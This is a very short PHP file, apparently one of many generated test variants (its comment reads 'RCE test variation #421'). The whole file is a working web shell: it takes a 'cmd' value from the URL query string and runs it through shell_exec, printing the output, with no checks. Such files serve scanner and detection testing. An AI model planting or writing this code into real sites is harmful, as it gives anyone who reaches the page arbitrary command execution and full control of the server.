<?php
// RCE test variation #421
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>